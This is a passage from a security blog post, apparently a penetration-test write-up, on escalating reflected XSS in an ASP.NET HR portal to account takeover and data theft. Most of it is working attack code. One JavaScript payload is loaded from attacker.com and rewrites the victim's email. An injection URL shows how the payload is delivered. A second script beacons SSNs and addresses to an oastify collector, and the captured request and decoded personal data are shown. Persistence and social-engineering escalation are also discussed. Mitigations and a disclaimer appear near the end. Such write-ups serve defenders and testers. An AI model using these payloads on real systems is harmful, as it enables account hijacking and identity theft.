Setup\u003c/h3\u003e\n\u003cp\u003eDuring our testing, we encountered an important browser security feature: mixed content blocking. Since CrossSiteCorp's website used HTTPS, attempting to load our JavaScript from a regular HTTP server resulted in the browser blocking the request. This is a security feature in modern browsers that prevents secure HTTPS pages from loading insecure HTTP resources, which could be tampered with in transit.\u003c/p\u003e\n\u003cp\u003eWe needed a quick and reliable way to serve our exploit over HTTPS. Setting up a traditional HTTPS server would typically require:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eObtaining an SSL certificate from a Certificate Authority\u003c/li\u003e\n\u003cli\u003eConfiguring a web server like Apache or Nginx\u003c/li\u003e\n\u003cli\u003eSetting up proper SSL/TLS settings\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eInstead, we opted for - \u003ca href=\"https://caddyserver.com/\"\u003eCaddy Server\u003c/a\u003e, which provides automatic HTTPS with minimal configuration. Caddy automatically obtains and renews SSL certificates from Let's Encrypt, making it perfect for quickly setting up a secure endpoint for our exploit.\u003c/p\u003e\n\u003cp\u003eWe created a JavaScript payload to host on our server (attacker.com/exploit.js):\u003c/p\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e;(async()=\u003e{\n  // Fetch the account page to get valid form values\n  const html = await fetch(\"/Account/Account.aspx\", {\n    credentials: \"include\"  // Include cookies for authenticated request\n  }).then(r=\u003er.text());\n\n  // Parse the HTML response\n  const doc = new DOMParser().parseFromString(html,\"text/html\");\n  const form = doc.querySelector(\"form\");\n\n  // Get the form's action URL\n  const base = `${window.location.origin}/Account/`;\n  const action = new URL(form.getAttribute(\"action\"), base).href;\n\n  // Extract all form data (including CSRF tokens)\n  const data = new FormData(form);\n\n  // Set the target button that would normally be clicked\n  data.set(\"__EVENTTARGET\", \"ctl00$Main$btnSave$btnPrimary\");\n  data.set(\"__EVENTARGUMENT\", \"\");\n  \n  // Change the email to one we control\n  data.set(\"ctl00$Main$txtEmail$txtText\", \"attacker@malicious.com\");\n\n  // Submit the modified form\n  const res = await fetch(action, {\n    method: \"POST\",\n    credentials: \"include\",\n    body: data\n  });\n\n  console.log(res.ok ? \"Profile updated successfully!\" : \"Failed to update profile\", res.status);\n})();\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow we needed to deliver this payload through our XSS vulnerability. A direct script tag wouldn't work well because our injection point was in the document head. Instead, we used an event listener to execute our code after the page had loaded:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ehttps://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123\u0026#x26;wd\"\u003e\u0026#x3C;script\u003eaddEventListener(\"load\",Function(\"document.head.appendChild(Object.assign(document.createElement(\\\"script\\\"),{\\\"src\\\":\\\"https://attacker.com/exploit.js\\\"}))\"));\u0026#x3C;/script\u003ejifk0=1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis payload:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eInjects a script tag into the page's head\u003c/li\u003e\n\u003cli\u003eAdds an event listener for the \"load\" event\u003c/li\u003e\n\u003cli\u003eWhen the page loads, creates a new script element pointing to our exploit.js file\u003c/li\u003e\n\u003cli\u003eAppends the script to the document head, causing it to load and execute\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e6. Account Takeover: The Final Step\u003c/h2\u003e\n\u003cp\u003eWhen a victim visited our specially crafted URL, their browser would execute our attack sequence:\u003c/p\u003e\n\u003ch3\u003eStage 1: Initial Execution\u003c/h3\u003e\n\u003cp\u003eThe victim loads the vulnerable Careers page with our malicious payload, and our injected script sets up a load event listener. When the page finishes loading, the listener executes, creating a new script element pointing to our hosted exploit.js, which is then loaded and executed in the context of crosssitecorp.com.\u003c/p\u003e\n\u003ch3\u003eStage 2: Profile Manipulation\u003c/h3\u003e\n\u003cp\u003eThe exploit script fetches the user's account page with their authenticated session and extracts the complete form structure including VIEWSTATE (ASP.NET's serialized page state), EVENTVALIDATION (validation hash for allowed form values), all form field values, and anti-CSRF tokens specific to the session. It then modifies only the email address field to one we control (attacker@malicious.com), constructs a multipart/form-data POST request with all original fields and tokens, and submits this request to the server, which validates all tokens and processes the change.\u003c/p\u003e\n\u003ch3\u003eStage 3: Account Takeover\u003c/h3\u003e\n\u003cp\u003eWith the email address changed in the system, we navigate to the login page, click \"Forgot Password\" and enter the victim's username. The system sends a password reset link to our attacker-controlled email. We receive the email, click the reset link, set a new password, and now have full access to the victim's account with valid credentials.\u003c/p\u003e\n\u003cp\u003eThis attack is especially dangerous because it leaves minimal traces in logs (all requests come from the victim's IP and browser), bypasses multi-factor authentication tied to the login process, works even if the victim has an active session on another device, is difficult to detect since it uses legitimate application functionality, and the user won't be notified of suspicious access attempts, only of a completed email change.\u003c/p\u003e\n\u003cp\u003eFrom the victim's perspective, they simply clicked a link and continued browsing. Behind the scenes, our code executed silently, changed their email, and gave us control of their account. The victim might only realize something was wrong when they stopped receiving account-related emails or were unable to log in with their password.\u003c/p\u003e\n\u003ch3\u003eAlternative Attack: Direct Data Exfiltration\u003c/h3\u003e\n\u003cp\u003eWhile changing the email address for account takeover is one approach, we also explored direct exfiltration of sensitive user data. This approach is particularly effective when targeting multiple users simultaneously through a mass XSS campaign. Instead of manipulating the form, we can simply extract and exfiltrate the sensitive information already displayed on the user's account page.\u003c/p\u003e\n\u003cp\u003eWe created an alternative payload focused on data exfiltration:\u003c/p\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e;(async()=\u003e{\n  // 1) Fetch the real \"Account\" form\n  const url  = `${window.location.origin}/Account/Account.aspx`;\n  const res  = await fetch(url, { credentials: 'include' });\n  const html = await res.text();\n\n  // 2) Parse it\n  const doc  = new DOMParser().parseFromString(html, 'text/html');\n  const form = doc.querySelector('form');\n\n  // 3) List the exact form-field names you really care about\n  const fields = [\n    'ctl00$Main$txtFirst$txtText',      // First name\n    'ctl00$Main$txtMiddle$txtText',     // Middle\n    'ctl00$Main$txtLast$txtText',       // Last name\n    'ctl00$Main$txtEmployeeNumber',     // Employee #\n    'ctl00$Main$txtSsn',                // SSN\n    'ctl00$Main$txtDOB$txtDate',        // DOB\n    'ctl00$Main$txtaddress1$txtText',   // Address\n    'ctl00$Main$txtCity$txtText',       // City\n    'ctl00$Main$cmbState$cmbSelection', // State\n    'ctl00$Main$txtZip$txtText',        // ZIP\n    'ctl00$Main$txtPhone',              // Home phone\n    'ctl00$Main$txtWorkPhone',          // Work phone\n    'ctl00$Main$txtMobilePhone',        // Mobile phone\n    'ctl00$Main$txtEmail$txtText',      // Work email\n    'ctl00$Main$txtPersonalEmail$txtText' // Personal email\n  ];\n\n  // 4) Slurp them out of a FormData blob\n  const fd   = new FormData(form);\n  const data = {};\n  for (const name of fields) {\n    data[name.replace(/\\W/g,'_')] = fd.get(name) || '';\n  }\n\n  // 5) b64-encode and beacon it off to your collaborator\n  const payload = btoa(JSON.stringify(data));\n  const img     = new Image();\n  img.src       = `https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/collect?data=${encodeURIComponent(payload)}`;\n  document.documentElement.appendChild(img);\n\n  console.log('üì° exfiltrated:', data);\n})();\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis script:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFetches the user's account page with their authenticated session\u003c/li\u003e\n\u003cli\u003eExtracts specific sensitive form fields\u003c/li\u003e\n\u003cli\u003eEncodes the data as base64\u003c/li\u003e\n\u003cli\u003eUses an image request to exfiltrate the data (which works even if fetch is blocked)\u003c/li\u003e\n\u003cli\u003eLogs the exfiltrated data to the console for debugging\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eWhen deployed, this payload successfully exfiltrated sensitive user information. In our Burp Collaborator, we received:\u003c/p\u003e\n\u003cpre class=\"language-http\"\u003e\u003ccode class=\"language-http\"\u003eGET /collect?data=ICAiY3RsMDBfTWFpbl90eHRGaXJzdF90eHRUZXh0IjogIk1pY2hhZWwiLAogICJjdGwwMF9NYWluX3R4dE1pZGRsZV90eHRUZXh0IjogIlJvYmVydCIsCiAgImN0bDAwX01haW5fdHh0TGFzdF90eHRUZXh0IjogIkpvaG5zb24iLAogICJjdGwwMF9NYWluX3R4dEVtcGxveWVlTnVtYmVyIjogIkVNUC00NTg5MiIsCiAgImN0bDAwX01haW5fdHh0U3NuIjogIjQyMS02OS04NzMyIiwKICAiY3RsMDBfTWFpbl90eHRET0JfdHh0RGF0ZSI6ICIwNC8xNy8xOTg1IiwKICAiY3RsMDBfTWFpbl90eHRhZGRyZXNzMV90eHRUZXh0IjogIjg3MjEgT2Frd29vZCBEcml2ZSwgQXBhcnRtZW50IDE1Q... HTTP/1.1\nHost: k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\nReferer: https://crosssitecorp.com/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen we decoded the base64 data, we found a wealth of sensitive information about the user:\u003c/p\u003e\n\u003cpre class=\"language-json\"\u003e\u003ccode class=\"language-json\"\u003e{\n  \"ctl00_Main_txtFirst_txtText\": \"Michael\",\n  \"ctl00_Main_txtMiddle_txtText\": \"Robert\",\n  \"ctl00_Main_txtLast_txtText\": \"Johnson\",\n  \"ctl00_Main_txtEmployeeNumber\": \"EMP-45892\",\n  \"ctl00_Main_txtSsn\": \"421-69-8732\",\n  \"ctl00_Main_txtDOB_txtDate\": \"04/17/1985\",\n  \"ctl00_Main_txtaddress1_txtText\": \"8721 Oakwood Drive, Apartment 15B\",\n  \"ctl00_Main_txtCity_txtText\": \"Arlington\",\n  \"ctl00_Main_cmbState_cmbSelection\": \"VA - Virginia\",\n  \"ctl00_Main_txtZip_txtText\": \"22201\",\n  \"ctl00_Main_txtPhone\": \"(703) 555-1842\",\n  \"ctl00_Main_txtWorkPhone\": \"(202) 555-9371\",\n  \"ctl00_Main_txtMobilePhone\": \"(703) 555-3914\",\n  \"ctl00_Main_txtEmail_txtText\": \"michael.johnson@crosssitecorp.com\",\n  \"ctl00_Main_txtPersonalEmail_txtText\": \"mike.johnson85@gmail.com\"\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis data represents a significant privacy breach, containing:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFull name and date of birth\u003c/li\u003e\n\u003cli\u003eSocial Security Number\u003c/li\u003e\n\u003cli\u003eComplete home address\u003c/li\u003e\n\u003cli\u003eMultiple contact phone numbers\u003c/li\u003e\n\u003cli\u003eBoth work and personal email addresses\u003c/li\u003e\n\u003cli\u003eEmployee identification number\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWith this information, an attacker could:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eConduct identity theft\u003c/li\u003e\n\u003cli\u003eTarget the user with highly convincing spear-phishing attacks\u003c/li\u003e\n\u003cli\u003eAttempt to access other accounts using the personal information for password recovery\u003c/li\u003e\n\u003cli\u003eSell the data on underground markets\u003c/li\u003e\n\u003cli\u003eUse the information for physical stalking or harassment\u003c/li\u003e\n\u003cli\u003eImpersonate the employee within the organization\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe most concerning aspect is that this attack can be deployed at scale. By finding a way to distribute the malicious URL (through targeted phishing, water-holing, or social engineering), an attacker could potentially exfiltrate data from hundreds or thousands of employees with minimal effort.\u003c/p\u003e\n\u003ch3\u003eVariations of the Attack\u003c/h3\u003e\n\u003cp\u003eThe attack techniques described can be extended in several ways for even greater impact. Attackers might establish long-term control by adding secondary recovery emails or phone numbers rather than changing the primary email, creating a less detectable backdoor to accounts that victims might never notice. Data exfiltration can be expanded beyond basic profile information to corporate data, financial records, and even internal documents depending on the user's access level.\u003c/p\u003e\n\u003cp\u003eOnce initial access is gained, attackers can use one account to send convincing internal communications to other employees, expanding the attack surface organically. Sophisticated attackers can maintain access while minimizing detection risk by making subtle changes to notification preferences or adding monitoring scripts, allowing them to observe user activities over extended periods without triggering security alerts.\u003c/p\u003e\n\u003ch2\u003e7. Impact and Lessons Learned\u003c/h2\u003e\n\u003cp\u003eThis attack chain demonstrates how a seemingly low-impact XSS vulnerability can be escalated to complete account takeover when combined with:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe ability to execute JavaScript in the victim's browser\u003c/li\u003e\n\u003cli\u003eKnowledge of the application's form structure\u003c/li\u003e\n\u003cli\u003eA clever approach to bypass anti-CSRF protections\u003c/li\u003e\n\u003cli\u003eAn understanding of how to manipulate the DOM\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e8. Mitigation Steps\u003c/h2\u003e\n\u003cp\u003eProtecting against this type of attack chain requires implementing several complementary security measures. Properly encoding all user input when reflecting it in HTML responses forms the first line of defense against XSS vulnerabilities, preventing attackers from injecting malicious scripts.\u003c/p\u003e\n\u003cp\u003eA robust Content Security Policy header provides an additional layer of protection by restricting which domains can serve executable scripts to your application. A policy like default-src 'self'; script-src 'self' would effectively prevent loading external malicious scripts, blocking the attack chain we demonstrated.\u003c/p\u003e\n\u003cp\u003eEmail change verification serves as a critical security checkpoint. By requiring verification from both the old and new email addresses before completing a change, applications can prevent unauthorized email modifications even if an attacker manages to bypass other protections.\u003c/p\u003e\n\u003ch2\u003e9. XSS in Modern Social Engineering and Red Team Operations\u003c/h2\u003e\n\u003cp\u003eThe attack techniques described in this article have significant implications beyond individual account takeovers. In modern red team operations and advanced social engineering campaigns, XSS vulnerabilities serve as powerful initial access vectors that can be leveraged for sophisticated privilege escalation and lateral movement within an organization.\u003c/p\u003e\n\u003ch3\u003ePrivilege Escalation via XSS\u003c/h3\u003e\n\u003cp\u003eOne of the most valuable aspects of XSS in real-world red team operations is its ability to enable privilege escalation. Once we've compromised a low-privilege account using the techniques described above, we can leverage that account to target higher-privilege users within the organization. Using information gathered from the compromised low-level account (such as organizational charts, internal communications, or reporting structures), we can identify users with elevated privileges like department heads, IT administrators, or C-level executives. With knowledge of the internal system, we can craft more sophisticated payloads that specifically target administrative interfaces or internal tools that aren't accessible to regular users.\u003c/p\u003e\n\u003ch3\u003eSocial Engineering Enhancement\u003c/h3\u003e\n\u003cp\u003eXSS significantly enhances social engineering efforts by exploiting trust relationships. Messages or links sent from a legitimate compromised account carry inherent trust - if a finance team member receives a link from a colleague they've worked with for years, they're much more likely to click it than a random external email. After compromising a low-level account, we gain visibility into ongoing projects, communication styles, and organizational norms, allowing us to craft highly convincing social engineering messages that reference real events, use appropriate terminology, and arrive at expected times.\u003c/p\u003e\n\u003cp\u003eIn one real-world (anonymized) example, we compromised a junior HR staff account via the XSS vulnerability, used that access to study internal communications and identify the IT support workflow, crafted a convincing \"password reset required\" message to the IT administrator, and gained administrative credentials that provided access to sensitive company data.\u003c/p\u003e\n\u003ch3\u003eReal-World Example: Sensitive Data Access Progression\u003c/h3\u003e\n\u003cp\u003eIn a sanitized example from a real engagement, we were able to demonstrate a concerning attack path: Initial compromise of a standard employee account through the XSS vulnerability, discovery of the company's internal ticketing system through the compromised account, identification of IT administrators who had recently helped other users, sending a targeted XSS link to an IT administrator through the internal messaging system, and compromise of the administrator account, providing access to user management systems, internal security configuration tools, customer data repositories, and financial information.\u003c/p\u003e\n\u003cp\u003eWhat made this attack particularly effective was that each step appeared legitimate to the victims. The XSS payload was delivered via trusted channels from known colleagues, making traditional security awareness training less effective as a defense.\u003c/p\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eThe journey from a simple reflected XSS vulnerability to full account takeover and sensitive data extraction demonstrates the profound security risks that seemingly minor vulnerabilities can pose when skillfully exploited. Through this complete attack chain, we've seen how modern web applications remain vulnerable despite decades of security awareness around cross-site scripting.\u003c/p\u003e\n\u003cp\u003eWhat makes this exploitation path particularly concerning is not its technical sophistication‚Äîwe used relatively simple JavaScript techniques‚Äîbut rather its effectiveness at bypassing multiple layers of security controls that organizations typically rely on. The attack circumvented HttpOnly cookie protections, anti-CSRF measures, and even the natural suspicion users might have toward external communications.\u003c/p\u003e\n\u003cp\u003eThe data exfiltration component reveals a critical privacy dimension often overlooked in XSS assessments. Beyond simply taking over accounts, attackers can silently harvest sensitive personal and corporate information that may have serious consequences for both individuals and organizations. The Social Security Numbers, home addresses, and contact details exposed in our testing represent just one category of sensitive data that might be compromised.\u003c/p\u003e\n\u003cp\u003eAs web applications continue to evolve and grow more complex, we can expect attackers to discover new ways of chaining vulnerabilities together. By understanding these sophisticated attack paths and implementing appropriate defenses, organizations can better protect their users' sensitive data and maintain the trust that's essential to their digital operations.\u003c/p\u003e\n\u003cp\u003eHappy Hacking! (Ethically, of course)\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"Cross-Site Scripting (XSS) vulnerabilities continue to plague web applications despite being well-understood for decades. While they might seem simple on the...","title":"XSS to Account Takeover \u0026 Data Exfiltration","date":"2025-04-24","tags":["Web Security","XSS","Account Takeover","CSRF","Session Riding","Data Exfiltration","Vulnerability Research"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"XSS-to-Account-Takeover-and-Data-Exfiltration"},"buildId":"EJgAsPo3Kz3qeohT_5Phd","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>